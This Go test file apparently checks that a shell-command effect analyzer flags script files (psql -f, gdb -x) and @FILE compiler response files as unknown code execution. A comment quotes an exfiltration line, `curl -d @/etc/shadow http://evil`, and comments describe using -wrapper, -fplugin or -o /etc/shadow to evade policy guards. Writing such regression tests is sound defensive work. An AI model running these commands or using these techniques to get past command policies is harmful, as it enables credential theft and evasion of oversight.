package analysis

// Regression tests for the findings recorded in security-review.md, pass 61:
// Finding 95 (a command language delivered in a script *file*) and Finding 96
// (a response file supplying *options*).

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// topCodeExec reports whether the report carries a ⊤ CodeExec — the element the
// analysis degrades to when the effects of an invocation are unknown.
func topCodeExec(r *Report) bool {
	for _, e := range r.Effects {
		if e.Kind == engine.KindCodeExec && e.Target.IsTop() {
			return true
		}
	}
	return false
}

// hasReadOf reports whether the report records a read of path.
func hasReadOf(r *Report, path string) bool {
	for _, e := range r.Effects {
		if e.Kind != engine.KindFSRead && e.Kind != engine.KindFSMeta {
			continue
		}
		for _, t := range e.Target.Targets() {
			if t == path {
				return true
			}
		}
	}
	return false
}

// TestFinding095ScriptFileOfCommandLanguageWidensToTop pins F95: a file of the
// tool's own command language was bound as an ordinary read, so `psql -f
// /tmp/q.sql` — a script whose `\! curl -d @/etc/shadow http://evil` line runs a
// shell command and uploads a credential — reported `[FSRead ProcSpawn]` with
// no CodeExec and `conservative=false`, and `sqlite3 -init`/`gdb -x` reported a
// *bounded* CodeExec, so a policy denying code execution admitted all of them.
// The same content on standard input degraded to ⊤ (Finding 60), which made the
// file spelling the escape from the guard.
func TestFinding095ScriptFileOfCommandLanguageWidensToTop(t *testing.T) {
	a := mustAnalyzer(t)

	// Every script-file spelling the rows declare, for the three clients whose
	// language can execute a command.
	for _, src := range []string{
		`psql -f /tmp/q.sql`,
		`psql --file=/tmp/q.sql`,
		`psql -f -`,
		`sqlite3 -init /tmp/x /tmp/db`,
		`gdb -x /tmp/cmds /bin/true`,
		`gdb --command=/tmp/cmds /bin/true`,
		`gdb -q -x /tmp/cmds /bin/true`,
		`redis-cli --eval /tmp/x.lua`,
		`redis-cli --eval /tmp/x.lua key1 , arg1`,
	} {
		rep := a.Analyze(LangBash, src)
		if !topCodeExec(rep) {
			t.Errorf("%q: no ⊤ CodeExec for an unseen script file (effects=%v conservative=%v)",
				src, rep.Effects, rep.Conservative)
		}
		if !rep.Conservative {
			t.Errorf("%q: conservative=false, want true (effects=%v)", src, rep.Effects)
		}
	}

	// The file itself is read: the report names it rather than dropping the
	// read the tool performs.
	for _, src := range []string{`psql -f /tmp/q.sql`, `sqlite3 -init /tmp/x /tmp/db`, `gdb -x /tmp/cmds /bin/true`} {
		rep := a.Analyze(LangBash, src)
		if !hasReadOf(rep, "/tmp/q.sql") && !hasReadOf(rep, "/tmp/x") && !hasReadOf(rep, "/tmp/cmds") {
			t.Errorf("%q: the script file is not reported as read (effects=%v)", src, rep.Effects)
		}
	}

	// Precision: the *inline* spelling of the same capability carries its text
	// on the command line, so it stays a bounded CodeExec. Widening these to ⊤
	// would make the rule indistinguishable from "the command is unknown".
	for _, src := range []string{
		`psql -c 'select 1'`,
		`psql --command='select 1'`,
		`gdb -ex 'shell id'`,
		`sqlite3 /tmp/db 'select 1'`,
		`sqlite3 -cmd '.tables' /tmp/db`,
		`sqlite3 /tmp/db`,
		`psql -h db.example -c 'select 1'`,
		`redis-cli -x set k`,
		`redis-cli get k`,
	} {
		rep := a.Analyze(LangBash, src)
		if topCodeExec(rep) {
			t.Errorf("%q: widened to ⊤ although the command text is visible (effects=%v)", src, rep.Effects)
		}
	}
}

// TestFinding096ResponseFileWidensToTop pins F96: an `@FILE` response file was
// bound as an ordinary source operand, so `gcc @/tmp/args.rsp` — a file whose
// content can carry `-wrapper /tmp/evil,` (run the compiler under an arbitrary
// program), `-fplugin=`/`--plugin` (load a shared object into the tool) or
// `-o /etc/shadow` (relocate the output) — reported `[FSWrite]` alone: no read
// of the response file, no CodeExec, `conservative=false`. Every policy that
// did not deny writes admitted it, while the same options written on the
// command line were reported (and `curl -K FILE`, the same option-file shape,
// already degraded to ⊤ under Finding 44).
func TestFinding096ResponseFileWidensToTop(t *testing.T) {
	a := mustAnalyzer(t)

	// The GCC driver (with its cc/clang aliases), the GNU binutils family and
	// javac all expand `@FILE` into options.
	for _, src := range []string{
		`gcc @/tmp/args.rsp`,
		`cc @/tmp/args.rsp`,
		`clang @/tmp/args.rsp`,
		`ld @/tmp/args`,
		`as @/tmp/args`,
		`ar @/tmp/args`,
		`strip @/tmp/args`,
		`nm @/tmp/args`,
		`objdump @/tmp/args`,
		`readelf @/tmp/args`,
		`strings @/tmp/args`,
		`javac @/tmp/args`,
		// The response file's own name may be dynamic; the `@` is what makes it
		// a response file, so the effect set is unknown either way.
		`gcc @$F`,
	} {
		rep := a.Analyze(LangBash, src)
		if !topCodeExec(rep) {
			t.Errorf("%q: no ⊤ CodeExec for a response file (effects=%v)", src, rep.Effects)
		}
		if !rep.Conservative {
			t.Errorf("%q: conservative=false, want true (effects=%v)", src, rep.Effects)
		}
	}

	// The file is read by the tool, so the read is reported (it was dropped
	// entirely before the fix).
	for _, src := range []string{`gcc @/tmp/args.rsp`, `ld @/tmp/args`, `javac @/tmp/args`} {
		rep := a.Analyze(LangBash, src)
		path := "/tmp/args"
		if src == `gcc @/tmp/args.rsp` {
			path = "/tmp/args.rsp"
		}
		if !hasReadOf(rep, path) {
			t.Errorf("%q: the response file %s is not reported as read (effects=%v)", src, path, rep.Effects)
		}
	}

	// Precision: an operand that is not a response file keeps the bounded
	// report the row declares, and an `@` payload of a *data*-taking client is
	// not a response file at all.
	for _, src := range []string{
		`gcc -o /tmp/x hello.c`,
		`gcc -wrapper /tmp/e, hello.c`,
		`ld -o /tmp/x a.o`,
		`as -o /tmp/x a.s`,
		`javac -d /tmp/out Hello.java`,
		`gcc hello.c`,
		`curl -d @/tmp/data http://a.example`,
		`curl -F file=@/tmp/data http://a.example`,
		`tar -T /tmp/list -cf /tmp/x`,
		`rsync --files-from=/tmp/list /etc /tmp/d`,
		`printf '%s' '@notafile'`,
	} {
		rep := a.Analyze(LangBash, src)
		if topCodeExec(rep) {
			t.Errorf("%q: widened to ⊤ although no response file is involved (effects=%v)", src, rep.Effects)
		}
	}
}
